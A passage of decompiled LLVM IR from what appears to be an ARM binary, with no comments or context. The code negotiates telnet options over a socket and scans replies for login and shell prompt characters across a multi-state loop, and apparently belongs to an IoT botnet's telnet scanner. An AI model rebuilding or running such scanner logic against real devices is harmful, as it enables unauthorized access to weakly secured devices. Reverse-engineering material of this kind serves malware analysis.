  store i32 %v3_11630, i32* %r0.global-to-local, align 4
  %v1_11634 = sub i32 256, %v3_11628
  store i32 %v1_11634, i32* %r2.global-to-local, align 4
  store i32 %v2_1162c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11640 = inttoptr i32 %v2_1162c to i32*
  %v5_11640 = call i32 @recv(i32 %v3_11630, i32* %v4_11640, i32 %v1_11634, i32 16384)
  store i32 %v5_11640, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11644 = icmp eq i32 %v5_11640, 0
  store i1 %v2_11644, i1* %cpsr_z.global-to-local, align 1
  %tmp330 = icmp slt i32 %v5_11640, 1
  br i1 %tmp330, label %dec_label_pc_11f24, label %dec_label_pc_1164c

dec_label_pc_1164c:                               ; preds = %dec_label_pc_11620
  %v0_1164c = load i32, i32* @r6, align 4
  store i32 %v0_1164c, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11654

dec_label_pc_11654:                               ; preds = %bb332, %dec_label_pc_1164c
  %v3_1165c = phi i32 [ %v1_11660, %bb332 ], [ %v0_1164c, %dec_label_pc_1164c ]
  %v1_11654 = load i32, i32* @r4, align 4
  %v2_11654 = add i32 %v1_11654, %v3_1165c
  %v3_11654 = inttoptr i32 %v2_11654 to i8*
  %v4_11654 = load i8, i8* %v3_11654, align 1
  %v6_11654 = zext i8 %v4_11654 to i32
  store i32 %v6_11654, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11658 = icmp eq i8 %v4_11654, 0
  store i1 %v2_11658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11658, label %bb331, label %bb332

bb331:                                            ; preds = %dec_label_pc_11654
  %v1_1165c = load i32, i32* %r1.global-to-local, align 4
  %v2_1165c = trunc i32 %v1_1165c to i8
  store i8 %v2_1165c, i8* %v3_11654, align 1
  %v0_11660.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb332

bb332:                                            ; preds = %dec_label_pc_11654, %bb331
  %v0_11660 = phi i32 [ %v3_1165c, %dec_label_pc_11654 ], [ %v0_11660.pre, %bb331 ]
  %v1_11660 = add i32 %v0_11660, 1
  store i32 %v1_11660, i32* %r2.global-to-local, align 4
  %v3_11664 = icmp uge i32 %v5_11640, %v1_11660
  store i1 %v3_11664, i1* %cpsr_c.global-to-local, align 1
  %v9_11664 = icmp eq i32 %v5_11640, %v1_11660
  store i1 %v9_11664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11664, label %dec_label_pc_1166c, label %dec_label_pc_11654

dec_label_pc_1166c:                               ; preds = %bb332, %dec_label_pc_11f28
  store i32 ptrtoint (i32* @global_var_1c218.208 to i32), i32* %r1.global-to-local, align 4
  %v0_11670 = load i32, i32* @r5, align 4
  %v1_11670 = add i32 %v0_11670, 24
  %v2_11670 = inttoptr i32 %v1_11670 to i32*
  %v3_11670 = load i32, i32* %v2_11670, align 4
  %v2_11674 = load i32, i32* @global_var_1c218.208, align 4
  store i32 %v2_11674, i32* %r3.global-to-local, align 4
  %v2_11678 = add i32 %v3_11670, %v5_11640
  store i32 %v2_11678, i32* %ip.global-to-local, align 4
  store i32 %v2_11678, i32* %v2_11670, align 4
  %v0_11680 = load i32, i32* %r3.global-to-local, align 4
  %v1_11680 = load i32, i32* @r5, align 4
  %v2_11680 = add i32 %v1_11680, 8
  %v3_11680 = inttoptr i32 %v2_11680 to i32*
  store i32 %v0_11680, i32* %v3_11680, align 4
  br label %dec_label_pc_11684

dec_label_pc_11684:                               ; preds = %dec_label_pc_11cd8, %dec_label_pc_1166c
  %v0_11684 = load i32, i32* @r5, align 4
  %v1_11684 = add i32 %v0_11684, 12
  %v2_11684 = inttoptr i32 %v1_11684 to i32*
  %v3_11684 = load i32, i32* %v2_11684, align 4
  store i32 %v3_11684, i32* %r2.global-to-local, align 4
  %v1_11688 = add i32 %v3_11684, -2
  store i32 %v1_11688, i32* %r3.global-to-local, align 4
  %v7_1168c = icmp eq i32 %v1_11688, 8
  store i1 %v7_1168c, i1* %cpsr_z.global-to-local, align 1
  %v5_11690 = and i32 %v1_11688, 1073741824
  %v6_11690 = icmp ne i32 %v5_11690, 0
  store i1 %v6_11690, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_11684, label %dec_label_pc_11604.loopexit [
    i32 2, label %dec_label_pc_116bc
    i32 3, label %dec_label_pc_117a0
    i32 4, label %dec_label_pc_11838
    i32 5, label %dec_label_pc_118c8
    i32 6, label %dec_label_pc_1197c
    i32 7, label %dec_label_pc_11ba0
    i32 8, label %dec_label_pc_11aec
    i32 9, label %dec_label_pc_11cfc
    i32 10, label %dec_label_pc_11c54
  ]

dec_label_pc_116bc:                               ; preds = %dec_label_pc_11684
  %v1_116bc = add i32 %v0_11684, 24
  %v2_116bc = inttoptr i32 %v1_116bc to i32*
  %v3_116bc = load i32, i32* %v2_116bc, align 4
  store i32 %v3_116bc, i32* %ip.global-to-local, align 4
  %v0_116c0 = load i32, i32* @sl, align 4
  store i32 %v0_116c0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 -3, i32* %r8.global-to-local, align 4
  %v1_116cc = add i32 %v0_11684, 29
  store i32 %v1_116cc, i32* @r4, align 4
  %v3_116d0104 = icmp eq i32 %v3_116bc, 0
  store i1 %v3_116d0104, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_116d0104, i1* %cpsr_z.global-to-local, align 1
  %v6_116d4111 = icmp sgt i32 %v3_116bc, 0
  br i1 %v6_116d4111, label %dec_label_pc_116d8.preheader, label %dec_label_pc_11780

dec_label_pc_116d0.loopexit:                      ; preds = %dec_label_pc_116f0
  %v2_116f8 = add i32 %v1_116f8, 2
  store i32 %v2_116f8, i32* @r6, align 4
  %v2_116fc = add i32 %v1_116fc, 2
  store i32 %v2_116fc, i32* @r4, align 4
  %v2_11700 = add i32 %v1_11700, 2
  store i32 %v2_11700, i32* @r7, align 4
  %v3_116d0 = icmp uge i32 %v2_11700, %v1_116d0
  store i1 %v3_116d0, i1* %cpsr_c.global-to-local, align 1
  %v9_116d0 = icmp eq i32 %v2_11700, %v1_116d0
  store i1 %v9_116d0, i1* %cpsr_z.global-to-local, align 1
  %v6_116d4 = icmp slt i32 %v2_11700, %v1_116d0
  br i1 %v6_116d4, label %dec_label_pc_116d8.preheader, label %dec_label_pc_11780

dec_label_pc_116d8.preheader:                     ; preds = %dec_label_pc_116bc, %dec_label_pc_116d0.loopexit
  %v6_11788185 = phi i32 [ %v6_11788186, %dec_label_pc_116d0.loopexit ], [ %v0_11684, %dec_label_pc_116bc ]
  %v1_11700175 = phi i32 [ %v2_11700, %dec_label_pc_116d0.loopexit ], [ 0, %dec_label_pc_116bc ]
  %v1_116f8173 = phi i32 [ %v2_116f8, %dec_label_pc_116d0.loopexit ], [ %v0_116c0, %dec_label_pc_116bc ]
  %v1_116e4171 = phi i32 [ %v1_116d0, %dec_label_pc_116d0.loopexit ], [ %v3_116bc, %dec_label_pc_116bc ]
  %v0_116d8169 = phi i32 [ %v2_116fc, %dec_label_pc_116d0.loopexit ], [ %v1_116cc, %dec_label_pc_116bc ]
  br label %dec_label_pc_116d8

dec_label_pc_116d8:                               ; preds = %dec_label_pc_116d8.preheader, %dec_label_pc_11760
  %v6_11788186 = phi i32 [ %v6_11788185, %dec_label_pc_116d8.preheader ], [ %v0_11768, %dec_label_pc_11760 ]
  %v1_11700 = phi i32 [ %v1_11700175, %dec_label_pc_116d8.preheader ], [ %v1_1176c, %dec_label_pc_11760 ]
  %v1_116f8 = phi i32 [ %v1_116f8173, %dec_label_pc_116d8.preheader ], [ %v1_11774, %dec_label_pc_11760 ]
  %v1_116d0 = phi i32 [ %v1_116e4171, %dec_label_pc_116d8.preheader ], [ %v3_11768, %dec_label_pc_11760 ]
  %v1_116fc = phi i32 [ %v0_116d8169, %dec_label_pc_116d8.preheader ], [ %v1_11778, %dec_label_pc_11760 ]
  %v1_116d8 = add i32 %v1_116fc, -1
  %v2_116d8 = inttoptr i32 %v1_116d8 to i8*
  %v3_116d8 = load i8, i8* %v2_116d8, align 1
  %v4_116d8 = zext i8 %v3_116d8 to i32
  store i32 %v4_116d8, i32* %r3.global-to-local, align 4
  %v2_116dc = icmp eq i8 %v3_116d8, -1
  store i1 %v2_116dc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_116dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116dc, label %dec_label_pc_116e4, label %dec_label_pc_11780

dec_label_pc_116e4:                               ; preds = %dec_label_pc_116d8
  %v0_116e4 = load i32, i32* @sl, align 4
  %v2_116e4 = add i32 %v0_116e4, %v1_116d0
  store i32 %v2_116e4, i32* %r2.global-to-local, align 4
  %v3_116e8 = icmp uge i32 %v2_116e4, %v1_116fc
  store i1 %v3_116e8, i1* %cpsr_c.global-to-local, align 1
  %v9_116e8 = icmp eq i32 %v2_116e4, %v1_116fc
  store i1 %v9_116e8, i1* %cpsr_z.global-to-local, align 1
  %v2_116ec = xor i1 %v3_116e8, true
  %v3_116ec = or i1 %v9_116e8, %v2_116ec
  br i1 %v3_116ec, label %dec_label_pc_11780, label %dec_label_pc_116f0

dec_label_pc_116f0:                               ; preds = %dec_label_pc_116e4
  %v1_116f0 = inttoptr i32 %v1_116fc to i8*
  %v2_116f0 = load i8, i8* %v1_116f0, align 1
  %v3_116f0 = zext i8 %v2_116f0 to i32
  store i32 %v3_116f0, i32* %r3.global-to-local, align 4
  %v2_116f4 = icmp eq i8 %v2_116f0, -1
  store i1 %v2_116f4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_116f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116f4, label %dec_label_pc_116d0.loopexit, label %dec_label_pc_11708

dec_label_pc_11708:                               ; preds = %dec_label_pc_116f0
  %v2_11708 = icmp ugt i8 %v2_116f0, -4
  store i1 %v2_11708, i1* %cpsr_c.global-to-local, align 1
  %v7_11708 = icmp eq i8 %v2_116f0, -3
  store i1 %v7_11708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11708, label %dec_label_pc_11db0, label %dec_label_pc_11710

dec_label_pc_11710:                               ; preds = %dec_label_pc_11708
  %v1_11710 = add i32 %v1_116f8, 2
  store i32 %v1_11710, i32* %r3.global-to-local, align 4
  %v3_11714 = icmp uge i32 %v2_116e4, %v1_11710
  store i1 %v3_11714, i1* %cpsr_c.global-to-local, align 1
  %v9_11714 = icmp eq i32 %v2_116e4, %v1_11710
  store i1 %v9_11714, i1* %cpsr_z.global-to-local, align 1
  %v2_11718 = xor i1 %v3_11714, true
  %v3_11718 = or i1 %v9_11714, %v2_11718
  br i1 %v3_11718, label %dec_label_pc_11780, label %dec_label_pc_1171c

dec_label_pc_1171c:                               ; preds = %bb354, %dec_label_pc_11e0c, %.thread77, %dec_label_pc_11710
  %v0_1171c = load i32, i32* @r4, align 4
  %v1_1171c = inttoptr i32 %v0_1171c to i8*
  %v2_1171c = load i8, i8* %v1_1171c, align 1
  %v3_1171c = zext i8 %v2_1171c to i32
  store i32 %v3_1171c, i32* %r3.global-to-local, align 4
  %v2_11720 = icmp ugt i8 %v2_1171c, -4
  store i1 %v2_11720, i1* %cpsr_c.global-to-local, align 1
  %v7_11720 = icmp eq i8 %v2_1171c, -3
  store i1 %v7_11720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11720, label %.thread64, label %dec_label_pc_11730

.thread64:                                        ; preds = %dec_label_pc_1171c
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_1171c, align 1
  %v0_1172c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1172c.pr.pr, label %bb334, label %.thread64.dec_label_pc_11730thread-pre-split_crit_edge

.thread64.dec_label_pc_11730thread-pre-split_crit_edge: ; preds = %.thread64
  %v0_11730.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11730

dec_label_pc_11730:                               ; preds = %dec_label_pc_1171c, %.thread64.dec_label_pc_11730thread-pre-split_crit_edge
  %v0_11730.pr = phi i32 [ %v0_11730.pr.pre, %.thread64.dec_label_pc_11730thread-pre-split_crit_edge ], [ %v3_1171c, %dec_label_pc_1171c ]
  %v2_11730 = icmp ugt i32 %v0_11730.pr, 250
  store i1 %v2_11730, i1* %cpsr_c.global-to-local, align 1
  %v7_11730 = icmp eq i32 %v0_11730.pr, 251
  store i1 %v7_11730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11730, label %bb333, label %bb334

bb333:                                            ; preds = %dec_label_pc_11730
  %v1_11734 = load i32, i32* %r8.global-to-local, align 4
  %v2_11734 = trunc i32 %v1_11734 to i8
  %v3_11734 = load i32, i32* @r4, align 4
  %v4_11734 = inttoptr i32 %v3_11734 to i8*
  store i8 %v2_11734, i8* %v4_11734, align 1
  br label %bb334

bb334:                                            ; preds = %.thread64, %dec_label_pc_11730, %bb333
  %v0_11738 = load i32, i32* @r4, align 4
  %v1_11738 = add i32 %v0_11738, 1
  %v2_11738 = inttoptr i32 %v1_11738 to i8*
  %v3_11738 = load i8, i8* %v2_11738, align 1
  %v4_11738 = zext i8 %v3_11738 to i32
  store i32 %v4_11738, i32* %r3.global-to-local, align 4
  %v2_1173c = icmp ugt i8 %v3_11738, -4
  store i1 %v2_1173c, i1* %cpsr_c.global-to-local, align 1
  %v7_1173c = icmp eq i8 %v3_11738, -3
  store i1 %v7_1173c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1173c, label %.thread67, label %dec_label_pc_1174c

.thread67:                                        ; preds = %bb334
  store i32 -4, i32* %ip.global-to-local, align 4
  store i8 -4, i8* %v2_11738, align 1
  %v0_11748.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11748.pr.pr, label %bb336, label %.thread67.dec_label_pc_1174c_crit_edge

.thread67.dec_label_pc_1174c_crit_edge:           ; preds = %.thread67
  %v0_1174c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1174c

dec_label_pc_1174c:                               ; preds = %.thread67.dec_label_pc_1174c_crit_edge, %bb334
  %v0_1174c = phi i32 [ %v0_1174c.pre, %.thread67.dec_label_pc_1174c_crit_edge ], [ %v4_11738, %bb334 ]
  %v2_1174c = icmp ugt i32 %v0_1174c, 250
  store i1 %v2_1174c, i1* %cpsr_c.global-to-local, align 1
  %v7_1174c = icmp eq i32 %v0_1174c, 251
  store i1 %v7_1174c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1174c, label %bb335, label %bb336

bb335:                                            ; preds = %dec_label_pc_1174c
  %v1_11750 = load i32, i32* %r8.global-to-local, align 4
  %v2_11750 = trunc i32 %v1_11750 to i8
  %v3_11750 = load i32, i32* @r4, align 4
  %v4_11750 = add i32 %v3_11750, 1
  %v5_11750 = inttoptr i32 %v4_11750 to i8*
  store i8 %v2_11750, i8* %v5_11750, align 1
  br label %bb336

bb336:                                            ; preds = %.thread67, %dec_label_pc_1174c, %bb335
  %v0_11754 = load i32, i32* @r5, align 4
  %v1_11754 = add i32 %v0_11754, 4
  %v2_11754 = inttoptr i32 %v1_11754 to i32*
  %v3_11754 = load i32, i32* %v2_11754, align 4
  store i32 %v3_11754, i32* %r0.global-to-local, align 4
  %v0_11758 = load i32, i32* @r6, align 4
  br label %dec_label_pc_11760

dec_label_pc_11760:                               ; preds = %dec_label_pc_11f7c, %bb336
  %storemerge10 = phi i32 [ %v2_11dcc, %dec_label_pc_11f7c ], [ %v0_11758, %bb336 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_11f7c ], [ 3, %bb336 ]
  store i32 %storemerge10, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11764 = inttoptr i32 %storemerge10 to i32*
  %v5_11764 = call i32 @send(i32 16384, i32* %v4_11764, i32 %storemerge, i32 16384)
  store i32 %v5_11764, i32* %r0.global-to-local, align 4
  %v0_11768 = load i32, i32* @r5, align 4
  %v1_11768 = add i32 %v0_11768, 24
  %v2_11768 = inttoptr i32 %v1_11768 to i32*
  %v3_11768 = load i32, i32* %v2_11768, align 4
  store i32 %v3_11768, i32* %ip.global-to-local, align 4
  %v0_1176c = load i32, i32* @r7, align 4
  %v1_1176c = add i32 %v0_1176c, 3
  store i32 %v1_1176c, i32* @r7, align 4
  %v3_11770 = icmp uge i32 %v1_1176c, %v3_11768
  store i1 %v3_11770, i1* %cpsr_c.global-to-local, align 1
  %v9_11770 = icmp eq i32 %v1_1176c, %v3_11768
  store i1 %v9_11770, i1* %cpsr_z.global-to-local, align 1
  %v0_11774 = load i32, i32* @r6, align 4
  %v1_11774 = add i32 %v0_11774, 3
  store i32 %v1_11774, i32* @r6, align 4
  %v0_11778 = load i32, i32* @r4, align 4
  %v1_11778 = add i32 %v0_11778, 3
  store i32 %v1_11778, i32* @r4, align 4
  %v5_1177c = icmp slt i32 %v1_1176c, %v3_11768
  br i1 %v5_1177c, label %dec_label_pc_116d8, label %dec_label_pc_11780

dec_label_pc_11780:                               ; preds = %dec_label_pc_116d0.loopexit, %dec_label_pc_116d8, %dec_label_pc_11760, %dec_label_pc_11710, %dec_label_pc_116e4, %dec_label_pc_116bc, %dec_label_pc_11db0.dec_label_pc_11780.loopexit_crit_edge
  %v6_11788 = phi i32 [ %v0_11dd8, %dec_label_pc_11db0.dec_label_pc_11780.loopexit_crit_edge ], [ %v0_11684, %dec_label_pc_116bc ], [ %v6_11788186, %dec_label_pc_116d8 ], [ %v0_11768, %dec_label_pc_11760 ], [ %v6_11788186, %dec_label_pc_11710 ], [ %v6_11788186, %dec_label_pc_116e4 ], [ %v6_11788186, %dec_label_pc_116d0.loopexit ]
  %v0_11790.pre = phi i32 [ %v0_11780.pre.pre, %dec_label_pc_11db0.dec_label_pc_11780.loopexit_crit_edge ], [ 0, %dec_label_pc_116bc ], [ %v1_11700, %dec_label_pc_116d8 ], [ %v1_1176c, %dec_label_pc_11760 ], [ %v1_11700, %dec_label_pc_11710 ], [ %v1_11700, %dec_label_pc_116e4 ], [ %v2_11700, %dec_label_pc_116d0.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11780 = icmp eq i32 %v0_11790.pre, 0
  store i1 %v2_11780, i1* %cpsr_z.global-to-local, align 1
  %tmp337 = icmp slt i32 %v0_11790.pre, 1
  br i1 %tmp337, label %dec_label_pc_11790, label %.thread224

.thread224:                                       ; preds = %dec_label_pc_11780
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_11788 = add i32 %v6_11788, 12
  %v8_11788 = inttoptr i32 %v7_11788 to i32*
  store i32 3, i32* %v8_11788, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11790:                               ; preds = %dec_label_pc_11780, %dec_label_pc_11d50, %dec_label_pc_11eb8, %dec_label_pc_11bf4, %dec_label_pc_11b40, %dec_label_pc_11a8c, %dec_label_pc_1191c, %dec_label_pc_11884, %dec_label_pc_117f4
  %v0_11790 = phi i32 [ %v1_11d44, %dec_label_pc_11d50 ], [ %v0_11eb0, %dec_label_pc_11eb8 ], [ %v1_11be8, %dec_label_pc_11bf4 ], [ %v1_11b34, %dec_label_pc_11b40 ], [ %v1_11a80, %dec_label_pc_11a8c ], [ %v1_11910, %dec_label_pc_1191c ], [ %v0_11884, %dec_label_pc_11884 ], [ %v0_117f4, %dec_label_pc_117f4 ], [ %v0_11790.pre, %dec_label_pc_11780 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11790 = icmp eq i32 %v0_11790, 0
  store i1 %v2_11790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11790, label %dec_label_pc_11604.loopexit, label %dec_label_pc_11798

dec_label_pc_11798:                               ; preds = %dec_label_pc_11790
  %v0_11798 = load i32, i32* @r5, align 4
  %v1_11798 = add i32 %v0_11798, 24
  %v2_11798 = inttoptr i32 %v1_11798 to i32*
  %v3_11798 = load i32, i32* %v2_11798, align 4
  store i32 %v3_11798, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_117a0:                               ; preds = %dec_label_pc_11684
  %v1_117a0 = add i32 %v0_11684, 24
  %v2_117a0 = inttoptr i32 %v1_117a0 to i32*
  %v3_117a0 = load i32, i32* %v2_117a0, align 4
  store i32 %v3_117a0, i32* %ip.global-to-local, align 4
  %v1_117a4 = add i32 %v3_117a0, -1
  store i32 %v1_117a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_117a8 = icmp eq i32 %v1_117a4, 0
  store i1 %v2_117a8, i1* %cpsr_z.global-to-local, align 1
  %v5_117ac = icmp sgt i32 %v1_117a4, 0
  br i1 %v5_117ac, label %dec_label_pc_117d4, label %dec_label_pc_1158c

dec_label_pc_117b4:                               ; preds = %bb338
  %v2_117b4 = icmp ugt i8 %v3_117d8, 35
  store i1 %v2_117b4, i1* %cpsr_c.global-to-local, align 1
  %v7_117b4 = icmp eq i8 %v3_117d8, 36
  store i1 %v7_117b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117b4, label %dec_label_pc_117e8, label %dec_label_pc_117bc

dec_label_pc_117bc:                               ; preds = %dec_label_pc_117b4
  %v2_117bc = icmp ugt i8 %v3_117d8, 34
  store i1 %v2_117bc, i1* %cpsr_c.global-to-local, align 1
  %v7_117bc = icmp eq i8 %v3_117d8, 35
  store i1 %v7_117bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117bc, label %dec_label_pc_117e8, label %dec_label_pc_117c4

dec_label_pc_117c4:                               ; preds = %dec_label_pc_117bc
  %v2_117c4 = icmp ugt i8 %v3_117d8, 36
  store i1 %v2_117c4, i1* %cpsr_c.global-to-local, align 1
  %v7_117c4 = icmp eq i8 %v3_117d8, 37
  store i1 %v7_117c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117c4, label %dec_label_pc_117e8, label %dec_label_pc_117cc

dec_label_pc_117cc:                               ; preds = %dec_label_pc_117c4
  %v1_117cc = add i32 %v0_117e8, -1
  store i32 %v1_117cc, i32* %r0.global-to-local, align 4
  %v2_117cc = icmp ne i32 %v0_117e8, 0
  store i1 %v2_117cc, i1* %cpsr_c.global-to-local, align 1
  %v7_117cc = icmp eq i32 %v0_117e8, 1
  store i1 %v7_117cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117cc, label %dec_label_pc_1158c, label %dec_label_pc_117d4

dec_label_pc_117d4:                               ; preds = %dec_label_pc_117a0, %dec_label_pc_117cc
  %v0_117e8 = phi i32 [ %v1_117cc, %dec_label_pc_117cc ], [ %v1_117a4, %dec_label_pc_117a0 ]
  %v2_117d4 = add i32 %v0_117e8, %v0_11684
  store i32 %v2_117d4, i32* %r3.global-to-local, align 4
  %v1_117d8 = add i32 %v2_117d4, 28
  %v2_117d8 = inttoptr i32 %v1_117d8 to i8*
  %v3_117d8 = load i8, i8* %v2_117d8, align 1
  %v4_117d8 = zext i8 %v3_117d8 to i32
  store i32 %v4_117d8, i32* %r3.global-to-local, align 4
  %v2_117dc = icmp ugt i8 %v3_117d8, 61
  store i1 %v2_117dc, i1* %cpsr_c.global-to-local, align 1
  %v7_117dc = icmp eq i8 %v3_117d8, 62
  store i1 %v7_117dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117dc, label %dec_label_pc_117e8, label %bb338

bb338:                                            ; preds = %dec_label_pc_117d4
  %v3_117e0 = icmp ugt i8 %v3_117d8, 57
  store i1 %v3_117e0, i1* %cpsr_c.global-to-local, align 1
  %v8_117e0 = icmp eq i8 %v3_117d8, 58
  store i1 %v8_117e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_117e0, label %dec_label_pc_117e8, label %dec_label_pc_117b4

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117d4, %bb338, %dec_label_pc_117c4, %dec_label_pc_117bc, %dec_label_pc_117b4
  %v1_117e8 = add i32 %v0_117e8, 1
  store i32 %v1_117e8, i32* @r7, align 4
  %v2_117ec = icmp eq i32 %v1_117e8, -1
  store i1 %v2_117ec, i1* %cpsr_c.global-to-local, align 1
  %v7_117ec = icmp eq i32 %v0_117e8, -2
  store i1 %v7_117ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117ec, label %dec_label_pc_1158c, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_115ec, %dec_label_pc_117e8
  %v0_117f4 = phi i32 [ %v0_115fc, %dec_label_pc_115ec ], [ %v1_117e8, %dec_label_pc_117e8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_117f4 = icmp eq i32 %v0_117f4, 0
  store i1 %v2_117f4, i1* %cpsr_z.global-to-local, align 1
  %tmp339 = icmp slt i32 %v0_117f4, 1
  br i1 %tmp339, label %dec_label_pc_11790, label %dec_label_pc_117fc

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117f4
  %v0_117fc = load i32, i32* @r5, align 4
  %v1_117fc = inttoptr i32 %v0_117fc to i32*
  %v2_117fc = load i32, i32* %v1_117fc, align 4
  store i32 %v2_117fc, i32* %r3.global-to-local, align 4
  %v1_11800 = add i32 %v0_117fc, 4
  %v2_11800 = inttoptr i32 %v1_11800 to i32*
  %v3_11800 = load i32, i32* %v2_11800, align 4
  store i32 %v3_11800, i32* %r0.global-to-local, align 4
  %v1_11804 = add i32 %v2_117fc, 12
  %v2_11804 = inttoptr i32 %v1_11804 to i8*
  %v3_11804 = load i8, i8* %v2_11804, align 1
  %v4_11804 = zext i8 %v3_11804 to i32
  store i32 %v4_11804, i32* %r2.global-to-local, align 4
  %v1_11808 = inttoptr i32 %v2_117fc to i32*
  %v2_11808 = load i32, i32* %v1_11808, align 4
  store i32 %v2_11808, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11810 = inttoptr i32 %v2_11808 to i32*
  %v5_11810 = call i32 @send(i32 %v3_11800, i32* %v4_11810, i32 %v4_11804, i32 16384)
  store i32 %v5_11810, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11818 = load i32, i32* @r5, align 4
  %v1_11818 = add i32 %v0_11818, 4
  %v2_11818 = inttoptr i32 %v1_11818 to i32*
  %v3_11818 = load i32, i32* %v2_11818, align 4
  store i32 %v3_11818, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_11824 = call i32 @send(i32 %v3_11818, i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), i32 2, i32 16384)
  store i32 %v5_11824, i32* %r0.global-to-local, align 4
  %v0_11828 = load i32, i32* @r5, align 4
  %v1_11828 = add i32 %v0_11828, 24
  %v2_11828 = inttoptr i32 %v1_11828 to i32*
  %v3_11828 = load i32, i32* %v2_11828, align 4
  store i32 %v3_11828, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_11830 = add i32 %v0_11828, 12
  %v3_11830 = inttoptr i32 %v2_11830 to i32*
  store i32 4, i32* %v3_11830, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11838:                               ; preds = %dec_label_pc_11684
  %v1_11838 = add i32 %v0_11684, 24
  %v2_11838 = inttoptr i32 %v1_11838 to i32*
  %v3_11838 = load i32, i32* %v2_11838, align 4
  store i32 %v3_11838, i32* %ip.global-to-local, align 4
  %v1_1183c = add i32 %v3_11838, -1
  store i32 %v1_1183c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11840 = icmp eq i32 %v1_1183c, 0
  store i1 %v2_11840, i1* %cpsr_z.global-to-local, align 1
  %v5_11844 = icmp sgt i32 %v1_1183c, 0
  br i1 %v5_11844, label %dec_label_pc_11864, label %dec_label_pc_11e18

dec_label_pc_1184c:                               ; preds = %bb340
  %v2_1184c = icmp ugt i8 %v3_11868, 35
  store i1 %v2_1184c, i1* %cpsr_c.global-to-local, align 1
  %v7_1184c = icmp eq i8 %v3_11868, 36
  store i1 %v7_1184c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1184c, label %dec_label_pc_11878, label %dec_label_pc_11854

dec_label_pc_11854:                               ; preds = %dec_label_pc_1184c
  %v2_11854 = icmp ugt i8 %v3_11868, 34
  store i1 %v2_11854, i1* %cpsr_c.global-to-local, align 1
  %v7_11854 = icmp eq i8 %v3_11868, 35
  store i1 %v7_11854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11854, label %dec_label_pc_11878, label %dec_label_pc_1185c

dec_label_pc_1185c:                               ; preds = %dec_label_pc_11854
  %v1_1185c = add i32 %v0_11878, -1
  store i32 %v1_1185c, i32* %r0.global-to-local, align 4
  %v2_1185c = icmp ne i32 %v0_11878, 0
  store i1 %v2_1185c, i1* %cpsr_c.global-to-local, align 1
  %v7_1185c = icmp eq i32 %v0_11878, 1
  store i1 %v7_1185c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1185c, label %dec_label_pc_11e18, label %dec_label_pc_11864

dec_label_pc_11864:                               ; preds = %dec_label_pc_11838, %dec_label_pc_1185c
  %v0_11878 = phi i32 [ %v1_1185c, %dec_label_pc_1185c ], [ %v1_1183c, %dec_label_pc_11838 ]
  %v2_11864 = add i32 %v0_11878, %v0_11684
  store i32 %v2_11864, i32* %r3.global-to-local, align 4
  %v1_11868 = add i32 %v2_11864, 28
  %v2_11868 = inttoptr i32 %v1_11868 to i8*
